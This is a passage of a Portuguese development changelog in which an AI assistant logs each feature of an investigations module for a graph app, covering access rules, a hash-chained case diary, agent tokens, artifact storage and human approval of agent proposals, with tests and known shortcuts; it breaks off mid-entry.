+1. Regras em `services/investigations.py` (`load_case(session, id, user, need)`), com
+   um `_session()` que devolve a sessão ou `None` em memória, para cada operação ter
+   um só fluxo de checagem e só o passo de gravação bifurcar. O router mapeia
+   `InvestigationError` para o envelope `{"error": …}` e audita depois (padrão do
+   `admin_groups`).
+2. Acesso como 03 §7: leitura = dono, responsável, share, superuser; escrita = dono,
+   responsável, share de escrita (superuser não escreve); gerenciar (apagar,
+   compartilhar) = dono ou superuser. Sem leitura → **404**, nunca 403.
+3. Share: `*` em qualquer posição → 422 `WILDCARD_SHARE_REFUSED`, mensagem cita a
+   vedação de tipping-off; o resto passa por `validate_owner_email`. O responsável
+   também precisa ser e-mail nominal.
+4. `PATCH` não aceita `status: "decidido"` (só a rota de decisão, F4.5); `null` em
+   campo obrigatório (`title`, `status`, `state`) é ignorado. Caso com `decision` →
+   409 no `PATCH` e no `DELETE`; o superuser apaga com `?reason=` (vai para a
+   auditoria).
+5. Ações de auditoria `investigation.create/update/delete/share/unshare`; as 5 rotas
+   mutáveis em `AUDITED_ROUTES`.
+
+**Files:** `api/graphlagoon/routers/investigations.py` (novo),
+`api/graphlagoon/services/investigations.py` (novo), `api/graphlagoon/models/schemas.py`,
+`api/graphlagoon/services/permission_catalog.py`, `api/graphlagoon/services/audit.py`,
+`api/graphlagoon/routers/admin_registry.py`, `api/graphlagoon/app.py`; testes
+`test_investigations.py` (novo), `test_permission_routes.py`, `test_admin_registry.py`,
+`test_admin_groups.py` e `test_permissions.py` (catálogo com a permissão nova).
+
+**Testing:** suíte `api/tests` verde (1323 passed), exceto as falhas pré-existentes
+conhecidas do transpilador, desmarcadas. Só o caminho em memória é exercitado; o
+caminho Postgres não foi rodado (sem Postgres no ambiente).
+
+**Assumptions / skipped:** prazos calculados na listagem ficam para a F4.4;
+`selected_at` não é preenchido ainda (F4.4); a affordance `can('investigation.create')`
+entra com o frontend (F1.5).
+
+**Public Docs:** no public docs impact (F1.9). **Admin-Area Impact:** permissão nova no
+catálogo (aparece na matriz do admin) e 5 rotas auditadas; `describeAudit` das ações
+novas fica para a F1.8.
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-09 23:55] - Feature Implemented: F1.3 · Fontes: adicionar e remover explorações
+
+**Feature:** `GET/POST /api/investigations/{id}/sources`,
+`DELETE …/sources/{sid}` e `GET …/sources/{sid}/snapshot` (03 §3.2).
+
+**Design Decisions:**
+1. **Acesso:** adicionar exige escrita no caso e leitura do context da exploração via
+   `get_context_with_access` (já cobre dono, share de exploração, share de context e
+   superuser). Exploração repetida no mesmo caso → 409.
+2. **Redação:** quem não lê o context recebe `accessible: false` com só `id`, `kind`,
+   `position`, `title_snapshot`, `context_title` e `owner_email`; o `/snapshot` dá 403
+   `SOURCE_RESTRICTED`.
+3. **Congelamento:** `{exploration (estado), snapshot}` em JSON canônico, gzip com
+   `mtime=0` (o hash depende só do conteúdo), chave
+   `{investigation_id}/sources/{source_id}.json.gz`, `sha256` dos bytes gravados.
+   Remover a fonte não apaga o blob (só a retenção apaga, 03 §2.3).
+4. **Armazenamento:** `BlobStore` via `build_blob_store`, raiz
+   `{databricks_volume_path}/investigations` ou `{exploration_snapshots_dir}/investigations`.
+   `shortcut:` reusa o volume e a autenticação do serviço de snapshot; a FA.2 cria o
+   setting `investigations_volume_path` e o próprio configure.
+5. Ações de auditoria `investigation.source_add` (com `sha256`) e
+   `investigation.source_remove`; as duas rotas mutáveis em `AUDITED_ROUTES`.
+6. `add_investigation_child` aceita `id` explícito (a chave do blob precisa dele antes
+   de gravar).
+
+**Files:** `api/graphlagoon/services/investigations.py`,
+`api/graphlagoon/routers/investigations.py`, `api/graphlagoon/models/schemas.py`,
+`api/graphlagoon/services/audit.py`, `api/graphlagoon/routers/admin_registry.py`,
+`api/graphlagoon/db/memory_store.py`, `api/tests/test_investigation_sources.py` (novo).
+
+**Testing:** `test_investigation_sources.py` (dois contexts, placeholder, acesso
+negado, hash e imutabilidade do congelado, auditoria) e suíte `api/tests` verde
+(1330 passed, falhas conhecidas do transpilador desmarcadas). Caminho Postgres não
+rodado (sem Postgres no ambiente).
+
+**Assumptions / skipped:** fonte `kind: "file"` fica para a F2.5; evento
+`source.added` no diário fica para a F1.7; reordenar fontes não foi pedido.
+
+**Public Docs:** no public docs impact (F1.9). **Admin-Area Impact:** 2 rotas
+auditadas e 2 ações de auditoria novas; `describeAudit` fica para a F1.8.
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-10 00:30] - Feature Implemented: F1.4 · Chaves de identidade no context
+
+**Feature:** `identity_keys` no context (03 §2.1): validação no backend, campo no
+create/update/response, seção "Identity Keys" no `GraphContextFormModal` e
+normalizadores em `utils/identityKeys.ts`.
+
+**Design Decisions:**
+1. `IdentityKey {node_type, entity, source: "node_id" | {kind:"prop", name}, normalize}`;
+   no máximo uma chave por tipo de nó (um nó resolve para uma só entidade), até 50.
+   O tipo de nó não é cruzado com `node_types` (contexts sem tipos descobertos).
+2. Formulário: seção (não aba; o modal não tem abas) com linhas editáveis e a faixa
+   "Keys of this context" em chips (T6). Linha incompleta é descartada no envio. UI em
+   inglês, como o resto do app.
+3. Normalizadores: `cpf_cnpj` devolve `null` para documento mascarado (`*`/`x`) e
+   repõe zeros à esquerda (11 ou 14 dígitos), porque colunas numéricas os perdem;
+   `account` separa grupos de dígitos por qualquer não-dígito e tira os zeros à
+   esquerda de cada um; `phone` tira o DDI 55 só com mais de 11 dígitos.
+4. `shortcut:` normalizadores só no TS; a versão Python entra quando o servidor
+   unificar (F2.8/F3.8).
+
+**Files:** `api/graphlagoon/models/schemas.py`, `api/graphlagoon/routers/graph_contexts.py`,
+`api/graphlagoon/db/memory_store.py`, `api/tests/test_context_identity_keys.py` (novo),
+`frontend/src/types/graph.ts`, `frontend/src/utils/identityKeys.ts` (novo),
+`frontend/src/utils/__tests__/identityKeys.test.ts` (novo),
+`frontend/src/components/GraphContextFormModal.vue` e seu teste.
+
+**Testing:** pytest `test_context_identity_keys.py` (+ testes de context vizinhos, 71
+verdes); vitest dos normalizadores e do modal (30 verdes); `vue-tsc` limpo.
+
+**Public Docs:** no public docs impact (F1.9). **Admin-Area Impact:** no admin-area
+impact (campo novo na rota de update do context, que já existe; ela não está em
+`AUDITED_ROUTES`, como antes).
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-10 01:30] - Feature Implemented: F1.5 · Frontend: rotas, store, API, fila (T1), adicionar (T3)
+
+**Feature:** rotas `/investigations` e `/investigations/:id`, store `investigation`,
+métodos de API, fila de casos (T1), modal "Add to investigation" (T3) aberto da
+lista de explorações, da toolbar do grafo (com exploração carregada) e do caso, e o
+link "Investigations" no topo.
+
+**Design Decisions:**
+1. **Fila (T1):** tabela com caso, tipologia, fontes, status, responsável, prazo e
+   atualização; filtros de busca e status (padrão "abertas"); 4 contadores.
+   `GET /api/investigations` passa a devolver `source_count` (uma query agrupada),
+   para a fila não fazer N chamadas. Filtros de tipologia/responsável e os pontos
+   coloridos por context ficaram de fora.
+2. **Prazo:** `shortcut:` 45 dias da criação (seleção) ou de `selected_at` (análise),
+   calculado no cliente (`utils/investigationStatus.ts`); a F4.4 leva para o servidor.
+3. **Modal (T3):** um componente para os dois sentidos: com `investigationId` o caso
+   é fixo; com `explorationId` a exploração vem marcada e o caso é escolhido (só casos
+   com escrita e não decididos). Explorações por context, as que já estão no caso
+   marcadas e desabilitadas, fontes `accessible:false` como placeholder com o dono
+   para pedir acesso, modo viva/congelada. A prévia é aproximada: contagem de
+   explorações e contexts novos e as chaves de identidade (F1.4) compartilhadas entre
+   os contexts envolvidos; a prévia exata de nós fica para a F1.6.
+4. Adicionar várias = uma chamada por exploração (a API recebe uma); para na
+   primeira falha e o toast diz quantas entraram.
+5. `InvestigationView.vue` entra já, mínima (lista de fontes e "Add explorations"),
+   para a rota `/investigations/:id` ter destino; a F1.6 a transforma no workspace.
+6. "New investigation" escondido sem `can('investigation.create')`; UI em inglês como
+   o resto do app. Abas "Arquivo" e "Query Console" do T3 ficam para F2.5.
+
+**Files:** `frontend/src/router/index.ts`, `src/types/investigation.ts` (novo),
+`src/services/api.ts`, `src/stores/investigation.ts` (novo),
+`src/views/InvestigationsView.vue` (novo), `src/views/InvestigationView.vue` (novo),
+`src/components/investigation/AddToInvestigationModal.vue` (novo),
+`src/utils/investigationStatus.ts` (novo), `src/components/Toolbar.vue`,
+`src/views/ExplorationsView.vue`, `e2e/helpers/api-mocks.ts` (`seedInvestigations`),
+`e2e/tests/investigations.spec.ts` (novo); backend
+`api/graphlagoon/services/investigations.py`, `models/schemas.py`
+(`source_count`), `api/tests/test_investigation_sources.py`.
+
+**Testing:** vitest `stores/__tests__/investigation.test.ts` e
+`views/__tests__/InvestigationsView.test.ts`; E2E `investigations.spec.ts` (3) mais
+`explorations.spec.ts` e `navigation.spec.ts` verdes; pytest das investigações (18);
+`vue-tsc` limpo.
+
+**Public Docs:** no public docs impact (F1.9). **Admin-Area Impact:** no admin-area
+impact.
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-10 02:30] - Feature Implemented: F1.6 · Grafo unificado e workspace (T2)
+
+**Feature:** `/investigations/:id` vira o workspace: aba "Unified view" mais uma aba
+por exploração (restritas como placeholder com cadeado), painel de fontes à
+esquerda, canvas do grafo no centro, inspector à direita (Data / Origin) e barra de
+status.
+
+**Design Decisions:**
+1. **`utils/unifyGraph.ts` (pura):** nó com chave de identidade vira `"Entidade:valor"`;
+   sem chave, `"{node_id}@{contextId}"` (id primeiro, para o rótulo padrão
+   `{node_id|truncate}` mostrar o id original; a ordem difere de 03 §5.1, a unicidade
+   é a mesma). Propriedade divergente fica com o primeiro valor e o resto vai para
+   `__conflicts` (inclui `node_type`); valor nulo não conta como conflito. Arestas
+   nunca se fundem entre fontes (`{sourceId}:{edge_id}`); aresta com ponta fora da
+   própria fonte é descartada. `snapshotToGraph` é reaproveitado no `loadExploration`.
+2. **`graph.ts`, modo investigação:** `loadInvestigationGraph(mode, nodes, edges)` carrega
+   sem `currentContext` e mantém a seleção dos ids ainda presentes. Como todas as abas
+   usam o id unificado, a seleção segue a entidade entre abas (seleção vinculada).
+   `expandFromNode` delega para `expandInvestigationNode`: uma origem por context, o
+   seletor (`mode.chooseOrigin`) só abre com mais de um, e o resultado volta para a
+   view, que o unifica como fonte `expansion:<sourceId>`.
+3. **Anéis:** `provenanceRingColors` e `PROVENANCE_PALETTE` em `graphAppearance.ts`;
+   `composables/useGraphRings.ts` desenha um sprite por anel (só na vista unificada).
+   `shortcut:` um sprite por anel; instanciar como o `FastIconRenderer` se os casos
+   chegarem a dezenas de milhares de nós. `__GRAPH_NODE_VISUAL_STATE__` passa a
+   devolver `rings` para o E2E.
+4. **Comunidades (aceite):** contornado na view: antes de trocar o grafo, guarda
+   `community.getState()` da aba atual e, depois do `nextTick`, restaura o da aba de
+   destino (mesmo padrão do `loadExploration`). Vale também para a expansão. O watcher
+   do `community.ts` não mudou, então a vista normal do grafo segue igual.
+5. **Carga:** `GET …/sources/{sid}/snapshot` por fonte legível e `GET` do context de
+   cada uma (chaves de identidade), em paralelo. `shortcut:` exploração sem snapshot
+   aparece vazia com aviso (sem re-executar a query); o estilo (cores, ícones, rótulos)
+   vem da primeira fonte legível.
+6. Fora do escopo (tarefas próprias): legenda de papéis e diário (F1.7), arquivos e
+   enriquecimento (F2), Dossiê/Export/Seguir o dinheiro (F3/F4), comunidades salvas nas
+   explorações-fonte não são remapeadas para a vista unificada.
+
+**Files:** `frontend/src/utils/unifyGraph.ts` (novo), `src/composables/useGraphRings.ts`
+(novo), `src/components/investigation/SourcesPanel.vue` (novo),
+`src/views/InvestigationView.vue`, `src/stores/graph.ts`, `src/stores/investigation.ts`,
+`src/utils/graphAppearance.ts`, `src/components/GraphCanvas3D.vue`, `src/services/api.ts`,
+`src/types/investigation.ts`; testes `src/utils/__tests__/unifyGraph.test.ts`,
+`src/stores/__tests__/graph.investigation.test.ts`,
+`src/views/__tests__/InvestigationView.test.ts`, `e2e/tests/investigations.spec.ts`.
+
+**Testing:** vitest dos três testes novos mais `graph.exploration`, `graph.actions`,
+`investigation` e `community.clusterProgram` (169 verdes); `vue-tsc` limpo; E2E
+`investigations.spec.ts` (duas fontes, um nó com dois anéis, abas),
+`style-presets.spec.ts` e `context-menu.spec.ts` verdes.
+
+**Public Docs:** no public docs impact (F1.9). **Admin-Area Impact:** no admin-area
+impact (só leitura de rotas existentes).
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-10 03:30] - Feature Implemented: F1.7 · Papéis, notas e diário
+
+**Feature:** diário do caso imutável e encadeado (`GET/POST …/events`), `PATCH
+…/state` para papéis e pins, CRUD de notas (`…/notes`), e no workspace: seletor de
+papel e aba "Notes" no inspector, legenda "Role (fill)" e o diário no rodapé.
+
+**Design Decisions:**
+1. `services.investigations.append_event`: `hash = sha256(prev_hash + json canônico)`
+   (chaves ordenadas, sem espaços, `at` em ISO), gravado na mesma sessão da mutação.
+   Toda mutação do servidor grava evento: `case.created/updated/shared/unshared`,
+   `source.added/removed`, `role.changed`, `pin.changed`, `note.created/updated/deleted`
+   (o `note.deleted` guarda o texto: apagar a nota não apaga o que foi dito).
+   `shortcut:` o `prev_hash` é lido sem lock; dois escritores simultâneos bifurcam a
+   cadeia; serializar por caso se a cadeia precisar ser verificável.
+2. Sem `PUT`/`DELETE` em eventos. `POST …/events` aceita só os tipos do cliente da 03
+   §3.4 (`trace.run`, `path.run`, `typology.accepted`, `nodes.promoted`,
+   `metric.saved`), payload ≤ 16 KB; o resto é 422. **Diferença da 03:**
+   `role.changed` é gravado pelo servidor no `PATCH …/state` (fonte confiável, sem
+   evento duplicado), não pelo cliente.
+3. Paginação: mais antigo primeiro, `after=<id do último evento>`, `limit` até 500.
+   `shortcut:` o front pede uma página de 500.
+4. `PATCH …/state` é merge por id unificado: `{roles: {uid: papel|null}, pins: {uid:
+   bool}}`; papéis `victim`, `mule`, `exit`, `discarded`. Notas: escrita no caso para
+   criar; editar e apagar só o autor; caso decidido é só-leitura (409).
+5. Preenchimento: `ROLE_COLORS` em `graphAppearance.ts` (azul, laranja, navy,
+   cinza, de 02 §Codificação), `graphStore.roleColors` entra no `AppearanceContext`
+   e vence comunidade e tipo; muda sem recarregar o grafo. A forma (quadrado para
+   saída) ficou de fora. UI de pins ficou de fora (só API).
+6. As rotas novas são `AUDIT_EXEMPT_ROUTES`: ficam no diário do próprio caso.
+
+**Files:** `api/graphlagoon/services/investigations.py`, `routers/investigations.py`,
+`models/schemas.py`, `routers/admin_registry.py`, `api/tests/test_investigation_events.py`
+(novo); `frontend/src/views/InvestigationView.vue`, `src/stores/investigation.ts`,
+`src/stores/graph.ts`, `src/utils/graphAppearance.ts`, `src/components/GraphCanvas3D.vue`,
+`src/services/api.ts`, `src/types/investigation.ts`,
+`src/views/__tests__/InvestigationView.test.ts`, `e2e/helpers/api-mocks.ts`
+(`seedInvestigations` com estado, notas e diário em memória).
+
+**Testing:** pytest `test_investigation_events.py` (cadeia, imutabilidade, paginação,
+tipos do cliente, papéis, notas) mais investigações e `test_admin_registry` (67
+verdes); vitest do `InvestigationView` e utils (1000 verdes); `vue-tsc` limpo; E2E
+`investigations.spec.ts` verde.
+
+**Public Docs:** no public docs impact (F1.9). **Admin-Area Impact:** 5 rotas novas
+em `AUDIT_EXEMPT_ROUTES` (registradas no diário do caso).
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-10 04:15] - Feature Implemented: F1.8 · Área admin e seed
+
+**Feature:** aba "Investigations" na área admin (todos os casos com dono, responsável,
+status, fontes e shares; abrir e transferir), contagem de casos no Overview,
+`describeAudit` para as ações `investigation.*` e casos de exemplo no seed.
+
+**Design Decisions:**
+1. A aba reusa `GET /api/investigations`, que já devolve tudo ao superuser (mesmo
+   padrão de contexts/explorations); filtro por texto e por dono.
+2. `POST /api/admin/investigations/{id}/transfer` (auditado como
+   `investigation.transfer`) chama `services.investigations.transfer_owner`: troca o
+   dono, remove o share redundante do novo dono e grava `case.transferred` no diário.
+   O dono anterior não guarda acesso implícito (igual às outras transferências).
+3. `AdminCounts.investigations` com padrão `0` (clientes antigos não quebram).
+4. Seed: até 4 casos, cada um de um usuário com explorações em 2+ contexts (até 3
+   fontes vivas), um share de escrita nominal, metade em análise e uma nota. Roda
+   antes das transferências de context do seed, que tirariam do dono o acesso às
+   próprias explorações. `shortcut:` as explorações do seed não têm snapshot, então
+   as fontes aparecem com o aviso "No saved graph" no workspace até alguém salvar.
+
+**Files:** `api/graphlagoon/routers/admin.py`, `services/investigations.py`,
+`services/audit.py`, `models/schemas.py`, `routers/admin_registry.py`,
+`dev/seed.py`, `api/tests/test_admin.py`, `api/tests/test_dev_seed.py`;
+`frontend/src/views/AdminView.vue`, `src/stores/admin.ts`, `src/services/api.ts`,
+`src/types/admin.ts`, `src/utils/adminView.ts`,
+`src/components/admin/TransferOwnershipModal.vue`,
+`src/views/__tests__/AdminView.logic.test.ts`.
+
+**Testing:** pytest `test_admin.py`, `test_admin_registry.py`, `test_audit.py`,
+`test_dev_seed.py` (100 verdes); vitest do AdminView e store admin (27); `vue-tsc`
+limpo; E2E `admin.spec.ts` verde.
+
+**Public Docs:** no public docs impact (F1.9). **Admin-Area Impact:** aba
+Investigations, contagem no Overview, rota de transferência em `AUDITED_ROUTES` e
+ação `investigation.transfer`.
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-10 05:00] - Feature Implemented: F1.9 · Docs públicas e E2E da fundação
+
+**Feature:** guia `docs/guide/investigations.md` (bloco TL;DR, fila, adicionar
+explorações vivas/congeladas, workspace, chaves de identidade, papéis, notas, diário,
+acesso e compartilhamento nominal, área admin), entrada na sidebar, linha
+`investigation.create` no catálogo de `permissions.md`, duas cenas de screenshot e a
+jornada E2E "criar caso → duas explorações de dois contexts → vista unificada".
+
+**Design Decisions:**
+1. Cenas `investigations-queue` e `investigations-workspace` em
+   `e2e/screenshots/generate.ts`: o grafo curado dividido em duas fontes (pessoas ↔
+   empresas, empresas → produtos) com chave `Company` por nome, para a vista
+   unificada mostrar anéis duplos e dois papéis. O workspace refaz o enquadramento
+   (Espaço + C) depois do layout, porque o primeiro ajuste roda antes de o grafo
+   abrir.
+2. `seedInvestigations` aceita as explorações para devolver título e `context_id` na
+   fonte criada, e serve o caso novo (`inv-new`) por uma rota genérica.
+3. Bug achado pela jornada: adicionar fontes não atualizava o diário na tela; o
+   store agora recarrega os eventos depois de `addExplorations`.
+4. README do pacote: cabeçalho de status diz que a F1 está concluída.
+
+**Files:** `docs/guide/investigations.md` (novo), `docs/.vitepress/config.ts`,
+`docs/guide/permissions.md`, `docs/public/screenshots/investigations-*.png` (novos),
+`frontend/e2e/tests/user-journeys.spec.ts`, `frontend/e2e/helpers/api-mocks.ts`,
+`frontend/e2e/screenshots/generate.ts`, `frontend/src/stores/investigation.ts`,
+`docs/dev/plans/investigation/README.md`.
+
+**Testing:** E2E `user-journeys.spec.ts` e `investigations.spec.ts` (12 verdes); as
+duas cenas novas geradas; `cd docs && npx vitepress build` passa.
+
+**Public Docs:** novo guia Investigations, sidebar e permissão no catálogo.
+**Admin-Area Impact:** no admin-area impact.
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-10 06:30] - Feature Implemented: FA.1 · Tokens de agente, escopos e ator no diário
+
+**Feature:** tokens pessoais de agente (`glt_` + 32 bytes base64url, só o sha256 é
+guardado, mostrado uma vez), escopos `read`/`analyze`/`write`/`propose`, Bearer no
+`AuthMiddleware`, `forbid_agents` nas rotas só humanas, limite de taxa por token,
+ator "agente X em nome de Y" no diário e na auditoria, lista e revogação no admin.
+
+**Design Decisions:**
+1. O middleware resolve `Authorization: Bearer glt_…` **antes** dos headers do proxy:
+   `request.state.user_email` = dono, `request.state.actor` = agente, e uma
+   `ContextVar` (`get_current_actor()`) para o diário e a auditoria gravarem o ator sem
+   passar o request por todos os serviços. Token desconhecido, expirado, revogado ou
+   `agents_enabled=false` → 401 `INVALID_AGENT_TOKEN`; acima do limite → 429.
+2. Escopo por padrão, para nenhuma rota nova ficar aberta: `agent_guard` é dependência
+   do `create_api_router`; GET exige `read`, o resto `write`. Uma rota declara outro
+   escopo com `require_agent_scope(...)` (marcador lido pelo guard) ou bloqueia com
+   `forbid_agents`. Rotas montadas sem o `create_api_router` não têm o guard.
+3. Só humanas hoje: `DELETE` do caso, share/unshare, todas as rotas de token
+   (`/api/agent-tokens`) e todo `/api/admin` e `/api/dev/clear-all`
+   (`require_superuser` chama `forbid_agents`, então o dono superuser não empresta o
+   poder ao agente). Decisão, aprovação, propostas e exportações entram com as suas
+   tarefas.
+4. Diário: colunas `actor_kind`, `agent_token_id`, `agent_name`; o agente entra no
+   hash do evento só quando existe (eventos humanos mantêm o formato anterior).
+   Auditoria: `metadata.agent = {token_id, name}`; o admin mostra "— via agent X".
+5. `shortcut:` limite de taxa em memória por processo (N workers ⇒ N× o limite);
+   evoluir para store compartilhado se o app rodar com vários workers.
+6. Fora do MVP: `last_used_at`, UI do usuário para criar token (só API; guia na
+   FA.7), auditoria de toda leitura do agente e aplicação de
+   `agents_allow_unmasked_data` (FA.4, nas ferramentas MCP), `PATCH` de status pelo
+   agente via proposta (FA.3). Seed sem tokens: agentes ficam desligados por padrão.
+
+**Files:** `api/graphlagoon/middleware/auth.py`, `utils/authz.py`,
+`services/agent_tokens.py` (novo), `routers/agent_tokens.py` (novo),
+`routers/admin.py`, `routers/admin_registry.py`, `routers/investigations.py`,
+`services/investigations.py`, `services/audit.py`, `services/permission_catalog.py`,
+`services/public_config.py`, `config.py`, `app.py`, `db/models.py`,
+`db/memory_store.py`, `alembic/versions/017_agents.py`, `models/schemas.py`;
+testes `test_agent_tokens.py` (novo), `test_permission_routes.py`, `test_admin.py`,
+`test_admin_registry.py`, `test_admin_groups.py`, `test_permissions.py`;
+`frontend/src/views/AdminView.vue`, `stores/admin.ts`, `services/api.ts`,
+`types/admin.ts`, `types/investigation.ts`, `utils/adminView.ts`,
+`views/InvestigationView.vue`, `views/__tests__/AdminView.logic.test.ts`.
+
+**Testing:** pytest `test_agent_tokens.py` (401 expirado/revogado, 403 em rota só
+humana com dono superuser, escopo, validade máxima, 429, admin, 404 desligado),
+registry, admin, permissões, auditoria e diário (186 verdes); vitest do AdminView e
+stores; `vue-tsc` limpo.
+
+**Public Docs:** `docs/guide/configuration.md` (seção AI agents) e
+`docs/guide/permissions.md` (`investigation.agent`). **Admin-Area Impact:** aba
+"Agent tokens" (visível com `agents_enabled`), rotas
+`GET/DELETE /api/admin/agent-tokens`, tabela `agent_tokens` em `CLEARABLE_TABLES`,
+quatro settings em `CONFIG_FIELD_KINDS`, ações `agent_token.create|revoke`.
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-10 08:00] - Feature Implemented: FA.2 · Armazenamento do caso no Volume e espaço de artefatos (T10)
+
+**Feature:** armazenamento do caso (`services/investigation_storage.py`) com upload em
+streaming + sha256 e sem sobrescrita; artefatos versionados
+(`investigation_artifacts`, `investigation_artifact_versions`, migração 018) com as
+rotas da 03 §8.5 e a aba "Case space" (T10) no workspace.
+
+**Design Decisions:**
+1. `BlobStore.save_stream(key, path)`: local move + `os.link` (falha se a chave
+   existe; sem hard link, checa e renomeia); Databricks `PUT` com corpo em stream,
+   `Content-Length` explícito e `overwrite=false` (409 → `FileExistsError`).
+2. `investigation_storage`: raiz `investigations_volume_path` (padrão
+   `{databricks_volume_path}/investigations`) ou `{exploration_snapshots_dir}/investigations`
+   (o mesmo diretório da F1.3, então fontes congeladas antigas continuam legíveis);
+   `configure_investigation_storage` no startup com o header provider do app. As
+   fontes congeladas da F1.3 passaram a usar este store (`source_key`).
+3. **Diferença da 03:** sem multipart (o projeto não tem `python-multipart`); binário
+   vai como corpo cru (`application/octet-stream`, nome/kind/note na query), lido de
+   `request.stream()` direto para um temporário enquanto o hash é calculado; texto vai
+   como JSON `{name, text}`. Limite `artifact_max_bytes` (100 MB) → 413.
+4. Tipo pela extensão (lista da 03 §8.5), content-type decidido pelo servidor; nova
+   versão precisa da mesma extensão e grava em `v{n}/{nome do artefato}`. `html`/`svg`
+   saem como `attachment` + `application/octet-stream`; todo conteúdo com `nosniff` e
+   `CSP: sandbox`. A API nunca devolve `blob_key`.
+5. Aprovar: `forbid_agents` + escrita no caso; versão já aprovada → 409. Versões
+   gravam `actor` (pessoa ou "agente X por Y"); eventos `artifact.created`,
+   `artifact.version_added`, `artifact.approved` no diário (rotas em
+   `AUDIT_EXEMPT_ROUTES`). `investigation_id` desnormalizado na versão (cascade e
+   paridade em memória por caso).
+6. T10: filtros por tipo/autor/status, preview de `md`/`txt` como texto puro
+   (`shortcut:` sem renderizar markdown, não há lib no projeto), imagem e PDF via blob
+   URL; demais tipos só download. "Levar ao dossiê" fica para a F4.2.
+   `shortcut:` download carrega o blob inteiro na memória do servidor; ler em stream
+   se artefatos crescerem.
+
+**Files:** `api/graphlagoon/services/blob_storage.py`, `services/investigation_storage.py`
+(novo), `services/investigation_artifacts.py` (novo), `services/investigations.py`,
+`routers/investigations.py`, `routers/admin_registry.py`, `models/schemas.py`,
+`db/models.py`, `db/memory_store.py`, `alembic/versions/018_artifacts.py`, `config.py`,
+`app.py`; `api/tests/test_investigation_storage.py`, `api/tests/test_artifacts.py`
+(novos); `frontend/src/components/investigation/ArtifactsSpace.vue` (novo),
+`views/InvestigationView.vue`, `services/api.ts`, `types/investigation.ts`,
+`components/__tests__/ArtifactsSpace.test.ts` (novo),
+`views/__tests__/InvestigationView.test.ts`, `e2e/helpers/api-mocks.ts`,
+`e2e/tests/investigations.spec.ts`.
+
+**Testing:** pytest storage (stream de 64 MiB com pico de memória < 8 MiB, limite,
+não sobrescreve local e Databricks com Files API mockada) e artefatos (versões,
+html/svg, agente sobe rascunho e leva 403 ao aprovar) mais investigações, registry,
+admin, tokens e blob storage (236 verdes); vitest do `ArtifactsSpace` e do
+`InvestigationView`; `vue-tsc` limpo; E2E "case space" verde.
+
+**Public Docs:** `docs/guide/investigations.md` (seção Case space) e
+`docs/guide/configuration.md` (Investigation storage). **Admin-Area Impact:** duas
+tabelas em `CLEARABLE_TABLES`, dois settings em `CONFIG_FIELD_KINDS`, três rotas em
+`AUDIT_EXEMPT_ROUTES` (registradas no diário do caso).
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-10 09:30] - Feature Implemented: FA.3 · Propostas e aprovação humana (T11)
+
+**Feature:** tabela `investigation_proposals` (migração 019), rotas `GET/POST
+…/proposals` e `POST …/proposals/{pid}/accept|reject`, a página T11
+(`/investigations/:id/agents`: conectar agente com criação de token, tokens ativos,
+propostas, atividade dos agentes) e o contador de propostas no cabeçalho do caso.
+
+**Design Decisions:**
+1. Aceitar chama o **mesmo** serviço da ação manual: papel → `update_state`, status e
+   tipologia → `update_investigation`; o evento (`role.changed`, `case.updated`) sai
+   igual ao manual, com a pessoa que aceitou como ator, e depois vem
+   `proposal.accepted` com `proposed_by` (o ator da proposta). Teste compara o diário
+   e o `state` de um caso via proposta com outro via PATCH manual.
+2. Tipos suportados agora: `role`, `status` (sem `decidido`), `typology`. `match`,
+   `hypothesis` e `hypothesis_status` → 422 `PROPOSAL_KIND_UNSUPPORTED` até a F2.8 e
+   a F4.2 criarem os serviços. Payload validado na criação.
+3. Criar exige escopo `propose` (`require_agent_scope`) e escrita no caso; aceitar e
+   recusar são `forbid_agents` e exigem escrita; recusar exige motivo (422 sem ele);
+   proposta já decidida → 409.
+4. Agente que tenta mudar papel (`PATCH …/state` com `roles`) ou status/tipologia
+   (`PATCH` do caso) leva 403 `AGENT_MUST_PROPOSE` (Q9). Pins e outros campos seguem
+   diretos.
+5. `current_actor()` saiu do serviço de artefatos para `services/investigations.py`
+   (usado por versões e propostas). `public_config` passa a expor
+   `agents_allow_unmasked_data` (nota de política na T11).
+6. T11: criação de token na própria página (a FA.1 não deixou UI), com o comando
+   `claude mcp add … /mcp` mostrando o token uma vez (o `/mcp` chega na FA.4).
+   `describeEvent` foi para `utils/investigationEvents.ts` com `describeProposal`.
+   `shortcut:` aceitar checa e aplica em duas sessões; dois aceites simultâneos
+   aplicam duas vezes (idempotente para estes tipos).
+
+**Files:** `api/graphlagoon/services/investigation_proposals.py` (novo),
+`services/investigations.py`, `services/investigation_artifacts.py`,
+`services/public_config.py`, `routers/investigations.py`, `routers/admin_registry.py`,
+`models/schemas.py`, `db/models.py`, `db/memory_store.py`,
+`alembic/versions/019_proposals.py`, `api/tests/test_proposals.py` (novo);
+`frontend/src/views/InvestigationAgentsView.vue` (novo), `views/InvestigationView.vue`,
+`utils/investigationEvents.ts` (novo), `router/index.ts`, `services/api.ts`,
+`types/investigation.ts`, `views/__tests__/InvestigationAgentsView.test.ts` (novo),
+`views/__tests__/InvestigationView.test.ts`.
+
+**Testing:** pytest `test_proposals.py` (aceite igual ao manual, agente bloqueado no
+aceite e no PATCH direto, motivo obrigatório, status, tipos não suportados) mais
+artefatos, investigações, registry, admin, tokens e auditoria (180 verdes); vitest
+da T11, do workspace e do `ArtifactsSpace`; `vue-tsc` limpo; E2E
+`investigations.spec.ts` verde.
+
+**Public Docs:** `docs/guide/investigations.md` (seção Agents and proposals).
+**Admin-Area Impact:** tabela `investigation_proposals` em `CLEARABLE_TABLES`; três
+rotas em `AUDIT_EXEMPT_ROUTES` (registradas no diário do caso).
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-10 11:00] - Feature Implemented: FA.4 · Servidor MCP em `/mcp`
+
+**Feature:** servidor MCP (SDK oficial `mcp`, extra opcional `mcp` no
